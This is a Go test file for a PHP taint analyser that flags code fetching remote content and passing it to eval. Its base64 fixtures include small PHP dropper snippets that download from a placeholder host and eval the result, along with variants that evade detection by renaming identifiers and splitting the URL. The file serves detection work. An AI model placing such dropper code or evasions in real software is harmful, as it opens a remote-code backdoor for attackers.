package phptaint

import (
	"context"
	"encoding/base64"
	"reflect"
	"testing"
)

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// Fixtures mirror the motivating sample and the two evasions that defeated
// the rejected regex approaches.
var (
	fxMotivating = b64(`<?php
function fetchContent($url) {
    $ch = curl_init($url);
    $data = curl_exec($ch);
    return $data;
}
$content = fetchContent('http://host/p.txt');
eval('?>' . $content);`)

	fxRenamed = b64(`<?php
function zqx($a) { $b = curl_init($a); $c = curl_exec($b); return $c; }
$q7 = zqx('http://host/p.txt');
eval('?>' . $q7);`)

	fxSplitURL = b64(`<?php
function grab($u) { return file_get_contents($u); }
$h = 'ho' . 'st';
$p = 'http://' . $h . '/payload';
$x = grab($p);
eval($x);`)

	// Each benign fixture below carries one unrelated, non-flowing call from
	// whichever keyword class (source/sink) its scenario otherwise lacks.
	// isCandidate requires both a source and a sink keyword present in the
	// byte stream before parsing runs at all (see TestPrefilterRejectsWithoutBothHalves
	// in prefilter_test.go); a fixture with only one half is StatusNotCandidate,
	// never reaching the deep analysis this test exercises.
	fxBenignLiteral = b64(`<?php
$cache = file_get_contents(__DIR__ . '/cache.json');
$code = 'return 1 + 1;';
eval($code);`)
	fxBenignEcho = b64(`<?php
function fetchContent($url) { return file_get_contents($url); }
$content = fetchContent('http://host/feed.xml');
echo htmlspecialchars($content);
include __DIR__ . '/parts/header.php';`)
	fxBenignInclude = b64(`<?php
$cache = file_get_contents('/etc/local-cache.txt');
$tpl = __DIR__ . '/parts/header.php';
include $tpl;`)
)

func run(t *testing.T, fixture string) Report {
	t.Helper()
	src, err := base64.StdEncoding.DecodeString(fixture)
	if err != nil {
		t.Fatalf("decode fixture: %v", err)
	}
	return Analyze(context.Background(), src)
}

func TestDetectsMotivatingSample(t *testing.T) {
	rep := run(t, fxMotivating)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("no flow reported for the motivating dropper")
	}
	if rep.Results[0].Sink != "eval" {
		t.Errorf("sink = %q, want eval", rep.Results[0].Sink)
	}
}

func TestDetectsRenamedIdentifiers(t *testing.T) {
	if len(run(t, fxRenamed).Results) == 0 {
		t.Fatal("renaming identifiers evaded detection")
	}
}

func TestDetectsSplitURL(t *testing.T) {
	if len(run(t, fxSplitURL).Results) == 0 {
		t.Fatal("splitting the URL across concatenation evaded detection")
	}
}

func TestBenignControlsReportNothing(t *testing.T) {
	for name, fx := range map[string]string{
		"literal": fxBenignLiteral,
		"echo":    fxBenignEcho,
		"include": fxBenignInclude,
	} {
		rep := run(t, fx)
		if rep.Status != StatusAnalyzed {
			t.Errorf("%s: status = %v (%s)", name, rep.Status, rep.Reason)
			continue
		}
		if len(rep.Results) != 0 {
			t.Errorf("%s: false positive: %+v", name, rep.Results)
		}
	}
}

func TestFunctionLocalDoesNotTaintTopLevelSameName(t *testing.T) {
	// A function-local variable must not taint an unrelated top-level
	// variable that merely shares its name.
	src := b64(`<?php
function fetch($c) { $tmp = curl_exec($c); return $tmp; }
$tmp = 'safe literal';
eval($tmp);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	for _, r := range rep.Results {
		if r.Sink == "eval" {
			t.Fatalf("false positive: clean top-level $tmp reported as %+v", r)
		}
	}
}

func TestResultsAreDeterministic(t *testing.T) {
	first := run(t, fxMotivating)
	for i := 0; i < 5; i++ {
		again := run(t, fxMotivating)
		if len(again.Results) != len(first.Results) {
			t.Fatalf("run %d: result count changed", i)
		}
		for j := range first.Results {
			// Result.Via is a []string, so Result is not comparable with !=;
			// reflect.DeepEqual preserves the same byte-identical intent.
			if !reflect.DeepEqual(again.Results[j], first.Results[j]) {
				t.Fatalf("run %d result %d differs", i, j)
			}
		}
	}
}
